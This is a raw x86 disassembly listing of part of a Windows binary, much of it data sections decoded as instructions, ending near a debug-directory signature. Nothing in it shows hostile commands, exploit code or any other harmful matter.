  43332e:	add    BYTE PTR [eax],al
  433330:	inc    ebp
  433331:	(bad)  
  433332:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433339:	mov    esi,DWORD PTR [edx-0x4]
  43333c:	add    bh,cl
  43333e:	dec    ebp
  43333f:	mov    dh,0x8b
  433341:	add    esi,DWORD PTR [ebx]
  433343:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433349:	add    BYTE PTR [eax],al
  43334b:	mov    eax,ecx
  43334d:	loopne 0x43339c
  43334f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433355:	dec    ebx
  433356:	or     eax,0x8b7232
  43335b:	in     al,0xc1
  43335d:	or     DWORD PTR [ebp-0x31],ecx
  433360:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433367:	xor    dh,BYTE PTR [edx-0x75]
  43336a:	add    al,dh
  43336c:	enter  0x4f09,0xcf
  433370:	inc    ebp
  433371:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433377:	or     al,BYTE PTR ds:0xe4728b
  43337d:	or     DWORD PTR [ebp-0x31],ecx
  433380:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433387:	cmp    dh,BYTE PTR [edx+0xf]
  43338a:	add    bl,dl
  43338c:	rol    DWORD PTR [eax],0x4d
  43338f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433395:	(bad)  
  433396:	or     eax,0x4b7284
  43339b:	xor    al,cl
  43339d:	mov    ecx,DWORD PTR [ebp-0x20]
  4333a0:	mov    ecx,DWORD PTR [ecx]
  4333a2:	xor    ecx,edi
  4333a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4333ab:	xor    cl,al
  4333ad:	mov    ecx,DWORD PTR [edi]
  4333af:	fadd   QWORD PTR [ebp+0x9]
  4333b2:	call   0xffd02e86
  4333b7:	dec    ebx
  4333b8:	dec    ebp
  4333b9:	xor    bh,BYTE PTR [ebx]
  4333bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4333bf:	loopne 0x4333bd
  4333c1:	or     edi,eax
  4333c3:	iret   
  4333c4:	ret    
  4333c5:	mov    WORD PTR [ebp+0x4f],es
  4333c8:	mov    esi,DWORD PTR [edx]
  4333ca:	call   0x8452fb09
  4333cf:	(bad)  
  4333d0:	fwait
  4333d1:	add    BYTE PTR [edx],dh
  4333d3:	mov    esi,DWORD PTR [ebx]
  4333d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4333db:	test   BYTE PTR [ebx],dh
  4333dd:	dec    ebx
  4333de:	add    esi,DWORD PTR [edx]
  4333e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333e6:	dec    edi
  4333e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4333ef:	xor    al,BYTE PTR [ebx]
  4333f1:	mov    edi,DWORD PTR [ebx]
  4333f3:	in     al,0x75
  4333f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333fb:	dec    ebx
  4333fc:	xor    esi,DWORD PTR [edx]
  4333fe:	lea    ecx,[edx]
  433400:	or     BYTE PTR [ebx+0x900f072],cl
  433406:	ja     0x4333d7
  433408:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43340f:	cmp    ch,al
  433411:	jne    0x433406
  433413:	mov    edi,edi
  433415:	fadd   QWORD PTR [ebp+0x0]
  433418:	mov    eax,edi
  43341a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433421:	mov    edx,DWORD PTR [ebx]
  433423:	in     al,0x45
  433425:	or     DWORD PTR [ebx],esi
  433427:	iret   
  433428:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43342f:	xor    dl,BYTE PTR [eax-0x75]
  433432:	sbb    al,0xe0
  433434:	dec    DWORD PTR [ecx]
  433436:	mov    ecx,edi
  433438:	in     al,dx
  433439:	mov    eax,es
  43343b:	dec    ebx
  43343c:	mov    DWORD PTR [edx],esi
  43343e:	fmul   QWORD PTR [edx]
  433440:	jne    0x4333cd
  433442:	(bad)  
  433443:	(bad)  
  433445:	or     DWORD PTR [ebp-0x31],eax
  433448:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43344f:	cmp    bh,bh
  433451:	jne    0x433498
  433453:	lea    ecx,[ebx-0x38372750]
  433459:	inc    ebx
  43345b:	mov    eax,ecx
  43345d:	mov    eax,0xa00c111
  433462:	jne    0x4334a9
  433464:	mov    esi,DWORD PTR [ebx]
  433466:	test   al,0x3
  433468:	inc    ebp
  433469:	mov    DWORD PTR [eax-0xc],edx
  43346c:	loop   0x4334b3
  43346e:	push   DWORD PTR [ebx]
  433470:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433476:	add    DWORD PTR [eax],eax
  433478:	mov    eax,edi
  43347a:	lods   al,BYTE PTR ds:[esi]
  43347b:	dec    ebp
  43347c:	inc    ebp
  43347d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433483:	retf   
  433484:	mov    edx,ecx
  433486:	adc    al,0x84
  433488:	(bad)  
  433489:	std    
  43348a:	ret    
  43348b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433491:	hlt    
  433492:	rol    edi,0x82
  433495:	ret    
  433496:	cld    
  433497:	enter  0x11ff,0x45
  43349b:	inc    ebp
  43349c:	pop    edi
  43349d:	mov    ebx,DWORD PTR [ebx+0x14]
  4334a0:	ret    0xc7
  4334a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4334a9:	jmp    0x433436
  4334ab:	push   0x8
  4334ad:	call   DWORD PTR [esi]
  4334af:	in     al,dx
  4334b0:	add    BYTE PTR [ebp+0x1],0x50
  4334b4:	add    bh,ah
  4334b6:	add    bh,bh
  4334b8:	icebp  
  4334b9:	mov    ecx,DWORD PTR [eax]
  4334bb:	cld    
  4334bc:	pop    es
  4334bd:	dec    ebp
  4334be:	shl    DWORD PTR [ebx],0x72
  4334c1:	add    eax,DWORD PTR [eax]
  4334c3:	cmp    edx,ecx
  4334c5:	je     0x4334d7
  4334c7:	mov    esi,DWORD PTR [ebp-0x4]
  4334ca:	inc    edi
  4334cc:	or     al,0xc3
  4334ce:	jmp    FWORD PTR [edx-0x18]
  4334d1:	(bad)  
  4334d2:	sti    
  4334d3:	cwde   
  4334d4:	(bad)  
  4334d5:	call   0xffa12de0
  4334da:	or     al,0x45
  4334dc:	push   ebp
  4334dd:	sub    esp,0x18
  4334e0:	push   ebx
  4334e1:	inc    ebp
  4334e2:	mov    edi,edi
  4334e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334eb:	test   al,0x54
  4334ed:	inc    ebp
  4334ee:	push   ecx
  4334ef:	push   eax
  4334f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334f6:	add    ah,bh
  4334f8:	(bad)  
  4334f9:	dec    ebp
  4334fa:	add    DWORD PTR [ebx],esi
  4334fc:	inc    ebp
  4334fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433503:	push   0xffffff8b
  433505:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43350b:	add    eax,DWORD PTR [ecx]
  43350d:	or     BYTE PTR [eax],al
  43350f:	call   0xff852d14
  433514:	mov    eax,DWORD PTR [ebp+0x14]
  433517:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43351d:	inc    ebp
  43351e:	dec    ecx
  43351f:	add    ebp,DWORD PTR [edx+0x14]
  433522:	push   0x8b3045
  433527:	call   0x33ad829c
  43352c:	inc    DWORD PTR [ebx]
  43352e:	mov    DWORD PTR [edi],ecx
  433530:	mov    eax,ecx
  433532:	or     BYTE PTR [ebp-0x3d],cl
  433535:	cmp    eax,edi
  433537:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43353c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433542:	adc    al,0xc9
  433544:	inc    ebp
  433545:	adc    BYTE PTR [eax+0x55],dl
  433548:	jne    0x433536
  43354a:	call   0xff5434da
  43354f:	dec    ebp
  433550:	inc    ebp
  433551:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433557:	add    BYTE PTR [ebx],bh
  433559:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43355d:	push   esp
  43355e:	or     al,0x51
  433560:	dec    ebp
  433561:	xor    DWORD PTR [ebx],0xf32039b
  433567:	cmp    eax,DWORD PTR [ebp+0x74]
  43356a:	mov    edi,edi
  43356c:	pop    edi
  43356d:	adc    BYTE PTR [ebx+0x75],bl
  433570:	ret    0x50
  433573:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433577:	(bad)  
  433578:	clc    
  433579:	mov    esp,ebp
  43357b:	pop    ecx
  43357c:	mov    ecx,0xf80085c2
  433581:	mov    ecx,DWORD PTR [ecx+edx*2]
  433584:	push   esi
  433585:	push   esi
  433586:	(bad)  
  433587:	lock add DWORD PTR [ebp+0x44],eax
  43358b:	mov    edx,DWORD PTR [eax]
  43358d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433591:	or     BYTE PTR [edi+eax*1+0x51],dl
  433595:	ret    
  433596:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43359c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4335a2:	or     al,0x80
  4335a4:	jge    0x4335a7
  4335a6:	mov    DWORD PTR [eax],eax
  4335a8:	and    al,0x8
  4335aa:	cmp    DWORD PTR [ebp+0x10],eax
  4335ad:	mov    edx,DWORD PTR [esi]
  4335af:	xchg   esp,eax
  4335b0:	dec    esp
  4335b1:	add    BYTE PTR [eax],dl
  4335b3:	mov    ecx,edx
  4335b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4335b9:	dec    ebp
  4335ba:	into   
  4335bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4335c1:	mov    edx,DWORD PTR [eax+0x14]
  4335c4:	das    
  4335c5:	add    al,0x45
  4335c7:	add    BYTE PTR [ebp+0x0],dh
  4335ca:	mov    edi,edi
  4335cc:	and    al,0x50
  4335ce:	mov    eax,DWORD PTR [eax]
  4335d0:	and    al,0xd1
  4335d2:	xor    eax,DWORD PTR [esi]
  4335d4:	lea    eax,[ebp+0x8]
  4335d7:	xor    esi,DWORD PTR [edx+0x3]
  4335da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335f0:	cmp    al,0xff
  4335f2:	pushf  
  4335f3:	mov    edi,edi
  4335f5:	or     BYTE PTR [esi+ecx*1],cl
  4335f8:	jne    0x4335bd
  4335fa:	call   0xc35c6
  4335ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433603:	mov    ebx,DWORD PTR [eax]
  433605:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433609:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433611:	pop    esi
  433612:	and    al,0xc9
  433614:	and    al,0x10
  433616:	call   DWORD PTR [ebp-0x73]
  433619:	in     al,dx
  43361a:	jmp    esp
  43361c:	je     0x4335a1
  43361e:	call   DWORD PTR [eax]
  433620:	and    al,0x31
  433622:	call   0xffcd34c3
  433627:	and    al,0x44
  433629:	push   edi
  43362a:	or     al,0x41
  43362c:	pop    esi
  43362d:	mov    ebp,esp
  43362f:	and    al,0xc2
  433631:	mov    eax,DWORD PTR [eax]
  433633:	and    al,0x85
  433635:	mov    edx,0x733080e
  43363a:	jne    0x433636
  43363c:	test   DWORD PTR [ebx+0x3083275],ebx
  433642:	dec    DWORD PTR [ecx-0x74dbdb15]
  433648:	sbb    BYTE PTR [esp+edx*1],cl
  43364b:	jl     0x43364c
  43364d:	adc    al,0x24
  43364f:	dec    ebp
  433650:	mov    esi,DWORD PTR [ebp+0xc]
  433653:	mov    ecx,DWORD PTR [eax]
  433655:	and    al,0x39
  433657:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43365a:	or     BYTE PTR [eax+edx*1],ah
  43365d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433664:	clc    
  433665:	jmp    0x433603
  433667:	adc    al,bh
  433669:	inc    esp
  43366a:	je     0x4336b8
  43366c:	and    al,0xc2
  43366e:	je     0x43360b
  433670:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433676:	dec    DWORD PTR [ecx+0x235fbf08]
  43367c:	sbb    al,0x10
  43367e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433682:	add    BYTE PTR [ebx+0xb],dh
  433685:	adc    BYTE PTR [eax],al
  433687:	mov    WORD PTR ds:0x3d450010,?
  43368d:	adc    BYTE PTR [eax],al
  43368f:	add    DWORD PTR [eax+edx*1],esp
  433692:	add    BYTE PTR [edx+0x6],cl
  433695:	adc    BYTE PTR [eax],al
  433697:	sub    dx,WORD PTR [eax]
  43369a:	add    bh,dl
  43369c:	imul   edx,DWORD PTR [eax],0x10302300
  4336a2:	add    BYTE PTR [esi+0x7b001077],dl
  4336a8:	ss inc ebx
  4336aa:	add    BYTE PTR [edi+0x36],bh
  4336ad:	inc    ebx
  4336ae:	add    BYTE PTR [ebx-0x78ffbcca],al
  4336b4:	ss inc ebx
  4336b6:	add    BYTE PTR [ebx-0x70ffbcca],cl
  4336bc:	ss inc ebx
  4336be:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336c4:	ss inc ebx
  4336c6:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [ebx-0x5fffbcca],ah
  4336d4:	adc    DWORD PTR [eax],edx
  4336d6:	add    BYTE PTR [ecx],cl
  4336d8:	jo     0x4336ea
  4336da:	add    BYTE PTR ds:0xd7001027,ch
  4336e0:	pop    eax
  4336e1:	adc    BYTE PTR [eax],al
  4336e3:	push   es
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [esi+0x33001031],ah
  4336ec:	ins    BYTE PTR es:[edi],dx
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jb     0x433730
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	shl    DWORD PTR [esi],cl
  4336f5:	inc    ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    dh,cl
  433714:	jge    0x433726
  433716:	add    BYTE PTR [esi-0x3dffef8e],dl
  43371c:	or     dl,BYTE PTR [eax]
  43371e:	add    dh,bl
  433720:	sub    dl,BYTE PTR [eax]
  433722:	add    BYTE PTR [edx],bl
  433724:	ins    BYTE PTR es:[edi],dx
  433725:	adc    BYTE PTR [eax],al
  433727:	addr16 jno 0x43373a
  43372a:	add    BYTE PTR [ebp+0x3d],ch
  43372d:	adc    BYTE PTR [eax],al
  43372f:	lds    esp,FWORD PTR [eax+0x10]
  433732:	add    BYTE PTR [ebx],dl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+edx*1],bh
  433755:	adc    BYTE PTR [eax],al
  433757:	clc    
  433758:	cmp    dl,BYTE PTR [eax]
  43375a:	add    BYTE PTR [ecx],ah
  43375c:	pop    ds
  43375d:	adc    BYTE PTR [eax],al
  43375f:	mov    edi,0x6001073
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [ecx+0x34],bh
  433769:	adc    BYTE PTR [eax],al
  43376b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43376f:	shl    DWORD PTR [edx+0x10],1
  433772:	add    BYTE PTR [ebx+0x37],dl
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebp+0x14],al
  433795:	adc    BYTE PTR [eax],al
  433797:	fwait
  433798:	pop    ds
  433799:	adc    BYTE PTR [eax],al
  43379b:	jnp    0x4337c0
  43379d:	adc    BYTE PTR [eax],al
  43379f:	pop    esi
  4337a0:	adc    BYTE PTR cs:[eax],al
  4337a3:	popf   
  4337a4:	jno    0x4337b6
  4337a6:	add    ah,bl
  4337a8:	inc    ebp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	sbb    edx,DWORD PTR [edx+0x10]
  4337ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [edi-0x64ffbcc9],dl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [edi-0x5cffbcc9],bl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi+0x54004337],ch
  4337d4:	xor    al,0x4b
  4337d6:	aaa    
  4337d7:	pop    edi
  4337d8:	inc    edx
  4337d9:	dec    ebx
  4337da:	xor    DWORD PTR [ecx],edi
  4337dc:	push   edi
  4337dd:	add    BYTE PTR [ecx+0x39],cl
  4337e0:	xor    al,0x5f
  4337e2:	pop    ecx
  4337e3:	inc    edi
  4337e4:	push   edx
  4337e5:	pop    edi
  4337e6:	dec    edx
  4337e7:	xor    al,BYTE PTR [edx+0x30]
  4337ea:	push   ebx
  4337eb:	add    BYTE PTR [ecx+0x4a],cl
  4337ee:	cmp    BYTE PTR [edi+0x38],bl
  4337f1:	xor    al,0x43
  4337f3:	xor    bl,BYTE PTR [eax+0x36]
  4337f6:	pop    edi
  4337f7:	inc    ebx
  4337f8:	add    BYTE PTR [edx+0x33],cl
  4337fb:	dec    ebp
  4337fc:	cmp    BYTE PTR [edi+0x53],bl
  4337ff:	xor    DWORD PTR [eax],edi
  433801:	pop    edx
  433802:	pop    edi
  433803:	xor    BYTE PTR [edx+0x52],cl
  433806:	inc    ecx
  433807:	add    BYTE PTR [edx+0x42],al
  43380a:	inc    ebp
  43380b:	pop    edi
  43380c:	cmp    DWORD PTR [eax],edi
  43380e:	push   ebp
  43380f:	inc    edx
  433810:	xor    eax,0x5244505f
  433815:	xor    BYTE PTR [eax],al
  433817:	inc    edx
  433818:	inc    esp
  433819:	inc    edx
  43381a:	cmp    DWORD PTR [edi+0x52],ebx
  43381d:	dec    esp
  43381e:	inc    ebp
  43381f:	add    BYTE PTR [ebx+0x37],dl
  433822:	push   esp
  433823:	xor    BYTE PTR [edi+0x55],bl
  433826:	push   ebx
  433827:	aaa    
  433828:	dec    ebp
  433829:	pop    edi
  43382a:	xor    ecx,DWORD PTR [edx+0x4e]
  43382d:	dec    ebx
  43382e:	add    BYTE PTR [edx+0x47],cl
  433831:	inc    edi
  433832:	xor    eax,0x534e5f32
  433837:	push   esp
  433838:	pop    edi
  433839:	push   esp
  43383a:	inc    edx
  43383b:	add    BYTE PTR [ebx+0x4d],al
  43383e:	xor    BYTE PTR [edi+0x47],bl
  433841:	cmp    DWORD PTR [ecx+0x5f],ebx
  433844:	push   eax
  433845:	push   ecx
  433846:	push   ecx
  433847:	pop    edi
  433848:	inc    ebx
  433849:	push   edi
  43384a:	push   esi
  43384b:	add    BYTE PTR [ecx+0x57],cl
  43384e:	inc    ebp
  43384f:	pop    edi
  433850:	pop    ecx
  433851:	push   edx
  433852:	inc    edx
  433853:	pop    edi
  433854:	inc    edi
  433855:	add    BYTE PTR [ebx+0x51],dl
  433858:	cmp    DWORD PTR ds:0x4d305f33,esi
  43385e:	inc    edi
  43385f:	xor    edx,DWORD PTR [edx+0x34]
  433862:	pop    edi
  433863:	pop    edx
  433864:	cmp    BYTE PTR [eax],al
  433866:	inc    edi
  433867:	xor    esi,DWORD PTR ds:0x5451585f
  43386d:	dec    esp
  43386e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433872:	pop    edi
  433873:	cmp    BYTE PTR [edi+0x49],dl
  433876:	xor    eax,0x5700505f
  43387b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43387f:	dec    esi
  433880:	dec    edx
  433881:	cmp    BYTE PTR [eax],al
  433883:	pop    edx
  433884:	dec    ebx
  433885:	xor    eax,0x4f5f3131
  43388a:	xor    dh,BYTE PTR [ecx]
  43388c:	pop    edi
  43388d:	inc    ebp
  43388e:	push   esp
  43388f:	inc    esp
  433890:	inc    ebp
  433891:	add    BYTE PTR [edi+0x55],dl
  433894:	cmp    DWORD PTR [edi+0x5a],ebx
  433897:	push   edx
  433898:	inc    edi
  433899:	xor    DWORD PTR [ebp+0x0],ecx
  43389c:	pop    edx
  43389d:	dec    ecx
  43389e:	dec    ebp
  43389f:	ss pop edi
  4338a1:	pop    edx
  4338a2:	push   edx
  4338a3:	cmp    BYTE PTR [esi+0x30],dl
  4338a6:	pop    edi
  4338a7:	push   ecx
  4338a8:	dec    esi
  4338a9:	add    BYTE PTR [ebx+0x32],dl
  4338ac:	inc    ebx
  4338ad:	cmp    BYTE PTR [edi+0x52],bl
  4338b0:	dec    ecx
  4338b1:	xor    BYTE PTR [eax],al
  4338b3:	inc    edi
  4338b4:	xor    eax,0x314f5f4b
  4338b9:	xor    DWORD PTR [edi+0x38],ebx
  4338bc:	push   ebp
  4338bd:	add    BYTE PTR [edi+0x4b],al
  4338c0:	xor    bl,BYTE PTR [edi+0x43]
  4338c3:	push   ebp
  4338c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4338c7:	ss pop edi
  4338c9:	pop    edx
  4338ca:	push   edi
  4338cb:	inc    esp
  4338cc:	xor    BYTE PTR [eax],al
  4338ce:	dec    ecx
  4338cf:	inc    edi
  4338d0:	xor    eax,0x3058555f
  4338d5:	dec    ebx
  4338d6:	pop    edi
  4338d7:	push   edi
  4338d8:	add    BYTE PTR [eax+0x0],bl
  4338db:	inc    edi
  4338dc:	add    BYTE PTR [edx+0x0],al
  4338df:	pop    edi
  4338e0:	add    BYTE PTR [ebx],dh
  4338e2:	add    BYTE PTR [eax],bh
  4338e4:	add    BYTE PTR [ebx+0x0],cl
  4338e7:	xor    eax,0x33003500
  4338ec:	add    BYTE PTR [eax],dh
  4338ee:	add    BYTE PTR [edi+0x0],bl
  4338f1:	push   esp
  4338f2:	add    BYTE PTR [ebp+0x0],cl
  4338f5:	xor    BYTE PTR [eax],al
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	inc    esi
  4338fa:	add    BYTE PTR [eax+0x0],bl
  4338fd:	xor    BYTE PTR [eax],al
  4338ff:	pop    edi
  433900:	add    BYTE PTR [ecx],dh
  433902:	add    BYTE PTR [ebx+0x0],al
  433905:	xor    eax,0x5f003100
  43390a:	add    BYTE PTR [ecx+0x0],al
  43390d:	xor    eax,DWORD PTR [eax]
  43390f:	add    BYTE PTR [eax],al
  433911:	push   ebx
  433912:	add    BYTE PTR [ebx+0x0],dl
  433915:	dec    eax
  433916:	add    BYTE PTR [edi+0x0],bl
  433919:	push   esp
  43391a:	add    BYTE PTR [ebx+0x0],al
  43391d:	push   ebx
  43391e:	add    BYTE PTR [edx+0x0],dl
  433921:	pop    edi
  433922:	add    BYTE PTR [ecx+0x0],dl
  433925:	dec    edi
  433926:	add    BYTE PTR [edi+0x0],al
  433929:	push   ecx
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	pop    ecx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],cl
  433933:	dec    edi
  433934:	add    BYTE PTR [ebp+0x0],dl
  433937:	cmp    DWORD PTR [eax],eax
  433939:	pop    edi
  43393a:	add    BYTE PTR [edx],dh
  43393c:	add    BYTE PTR [eax+eax*1+0x32],al
  433940:	add    BYTE PTR ds:0x47005f00,dh
  433946:	add    BYTE PTR ds:0x48000000,dh
  43394c:	add    BYTE PTR [edx+0x0],cl
  43394f:	push   eax
  433950:	add    BYTE PTR [edi+0x0],bl
  433953:	cmp    BYTE PTR [eax],al
  433955:	add    BYTE PTR ss:0x55004100,dh
  43395c:	add    BYTE PTR [edi+0x0],bl
  43395f:	push   edx
  433960:	add    BYTE PTR [edi],dh
  433962:	add    BYTE PTR [ecx+0x0],cl
  433965:	add    BYTE PTR [eax],al
  433967:	inc    esp
  433968:	add    BYTE PTR [ecx+0x0],dl
  43396b:	inc    edx
  43396c:	add    BYTE PTR [edi+0x0],bl
  43396f:	push   ecx
  433970:	add    BYTE PTR [ecx+0x0],bl
  433973:	dec    edi
  433974:	add    BYTE PTR [eax+0x0],dl
  433977:	add    BYTE PTR [eax],al
  433979:	dec    edx
  43397a:	add    BYTE PTR [ecx+0x0],dl
  43397d:	inc    esp
  43397e:	add    BYTE PTR [edi+0x0],bl
  433981:	dec    edx
  433982:	add    BYTE PTR [eax],dh
  433984:	add    BYTE PTR [ecx],dh
  433986:	add    BYTE PTR [ebx+0x0],dl
  433989:	push   ecx
  43398a:	add    BYTE PTR [ecx],dh
  43398c:	add    BYTE PTR [edi+0x0],bl
  43398f:	push   edi
  433990:	add    BYTE PTR [eax],al
  433992:	add    BYTE PTR [ebx+0x0],cl
  433995:	pop    edx
  433996:	add    BYTE PTR [esi],dh
  433998:	add    BYTE PTR [edi+0x0],bl
  43399b:	inc    ebx
  43399c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4339a0:	add    BYTE PTR [edi+0x0],bl
  4339a3:	push   edi
  4339a4:	add    BYTE PTR [ebx],dh
  4339a6:	add    BYTE PTR [esi+0x0],cl
  4339a9:	push   ebp
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	dec    edx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],dl
  4339b3:	aaa    
  4339b4:	add    BYTE PTR [eax],bh
  4339b6:	add    BYTE PTR [edi+0x0],bl
  4339b9:	pop    eax
  4339ba:	add    BYTE PTR [edi+0x0],cl
  4339bd:	inc    edi
  4339be:	add    BYTE PTR [edi+0x0],bl
  4339c1:	xor    al,0x0
  4339c3:	push   eax
  4339c4:	add    BYTE PTR [ecx+0x0],cl
  4339c7:	push   ebp
  4339c8:	add    BYTE PTR [eax],al
  4339ca:	add    BYTE PTR [edi+0x0],dl
  4339cd:	push   esp
  4339ce:	add    BYTE PTR [ebx+0x0],cl
  4339d1:	add    BYTE PTR [eax],al
  4339d3:	add    BYTE PTR [edx+0x53],dl
  4339d6:	inc    esp
  4339d7:	push   ebx
  4339d8:	xchg   esi,eax
  4339d9:	into   
  4339da:	jmp    0x8d4d:0x9b7ee484
  4339e1:	sub    al,0x5b
  4339e3:	(bad)  
  4339e4:	int    0x1b
  4339e6:	call   0x435575
  4339eb:	add    BYTE PTR [edx+edi*1+0x5c],dl
  4339ef:	jns    0x433a5a
  4339f1:	addr16 push edi
  4339f3:	bound  bx,DWORD PTR [edx+0x45]
  4339f7:	outs   dx,BYTE PTR ds:[esi]
  4339f8:	pop    esp
  4339f9:	je     0x433a6e
  4339fb:	ja     0x433a3e
  4339fd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a05:	js     0x433a76
  433a07:	jp     0x433a78
  433a09:	jns    0x433a6f
  433a0b:	jp     0x433a75
  433a0d:	je     0x433a73
  433a0f:	jp     0x433a73
  433a11:	cs jo  0x433a78
  433a14:	bound  eax,QWORD PTR [eax]
	...
